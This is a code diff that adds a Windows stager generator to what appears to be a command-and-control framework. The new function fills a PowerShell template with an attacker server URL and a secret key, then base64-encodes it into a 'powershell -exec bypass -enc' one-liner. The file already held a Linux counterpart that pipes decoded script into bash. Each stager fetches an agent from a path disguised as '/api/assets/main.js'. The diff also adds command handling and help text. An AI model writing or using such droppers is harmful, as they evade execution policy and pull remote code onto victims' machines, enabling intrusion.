@@ -3,7 +3,7 @@ import warnings
 import os
 import datetime
 
-def _generate_encoded_linux_binary_stager(listener_info: dict) -> str:
+def _generate_encoded_linux_binary_stager(listener_info):
     host = listener_info.get('host')
     port = listener_info.get('port')
     protocol = listener_info.get('type', 'http')
@@ -70,6 +70,32 @@ rm -f "$CURRENT_SCRIPT"
     stager = f'bash -c "$(echo \'{encoded_script}\' | base64 -d)"'
     return stager
 
+def _generate_encoded_windows_exe_stager(listener_info):
+    host = listener_info.get('host')
+    port = listener_info.get('port')
+    protocol = listener_info.get('type', 'http')
+    c2_url = f"{protocol}://{host}:{port}"
+    download_uri = listener_info.get('download_uri', '/api/assets/main.js')
+    full_agent_url = f"{c2_url}{download_uri}"
+
+    import os
+    secret_key = os.environ.get('SECRET_KEY')
+    if not secret_key:
+        raise Exception("SECRET_KEY environment variable not found during dropper generation!")
+
+    script_dir = os.path.dirname(__file__)
+    template_path = os.path.join(script_dir, 'windows_exe_stager_template.ps1')
+
+    with open(template_path, 'r') as f:
+        ps_template = f.read()
+
+    ps_template = ps_template.replace('{secret_key}', secret_key).replace('{full_agent_url}', full_agent_url)
+
+    import base64
+    encoded_ps = base64.b64encode(ps_template.encode('utf-16le')).decode('utf-8')
+    stager = f'powershell -exec bypass -enc {encoded_ps}'
+    return stager
+
 def handle_interactive_stager_command(command_parts: list, session: object) -> tuple:
     if len(command_parts) < 2:
         help_text = """
@@ -85,6 +111,7 @@ def handle_interactive_stager_command(command_parts: list, session: object) -> t
 
 **Example:**
   `stager generate linux_binary host=10.10.10.5 port=80 protocol=http`
+  `stager generate windows_exe host=10.10.10.5 port=80 protocol=http`
 """
         return help_text, 'info'
     action = command_parts[1].lower()
@@ -128,13 +155,41 @@ def handle_interactive_stager_command(command_parts: list, session: object) -> t
                 return response, 'success'
             except Exception as e:
                 return f"Linux binary stager generation failed: An unexpected error occurred: {e}", 'error'
+        elif stager_type == 'windows_exe':
+            host = options.get('host')
+            port = options.get('port')
+            protocol = options.get('protocol', 'http').lower()
+            download_uri = options.get('download_uri', '/api/assets/main.js')
+            if not (host and port):
+                return "Missing Arguments. Both `host` and `port` are required for droppers.", 'error'
+            if protocol not in ['http', 'https']:
+                return "Invalid Protocol. Must be `http` or `https`.", 'error'
+            try:
+                listener_info = {
+                    "host": host,
+                    "port": port,
+                    "type": protocol,
+                    "download_uri": download_uri
+                }
+                stager_content = _generate_encoded_windows_exe_stager(listener_info)
+                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+                filename = f"windows_exe_stager_{timestamp}.txt"
+                filepath = os.path.join("logs", filename)
+                os.makedirs("logs", exist_ok=True)
+                with open(filepath, 'w') as f:
+                    f.write(stager_content)
+                response = f"Windows EXE stager saved to: {filepath}\n\n{stager_content}"
+                return response, 'success'
+            except Exception as e:
+                return f"Windows EXE stager generation failed: An unexpected error occurred: {e}", 'error'
         else:
-            return f"Unsupported Type: '{stager_type}'. Available: `linux_binary`.", 'error'
+            return f"Unsupported Type: '{stager_type}'. Available: `linux_binary`, `windows_exe`.", 'error'
     elif action == 'list':
         output = """
 **Available Stager Types:**
 ─────────────────────────────────────
   `linux_binary`       - Linux binary execution stager downloading from /api/assets/main.js
+  `windows_exe`        - Windows EXE execution stager downloading from /api/assets/main.js
 ─────────────────────────────────────
 """
         return output, 'success'
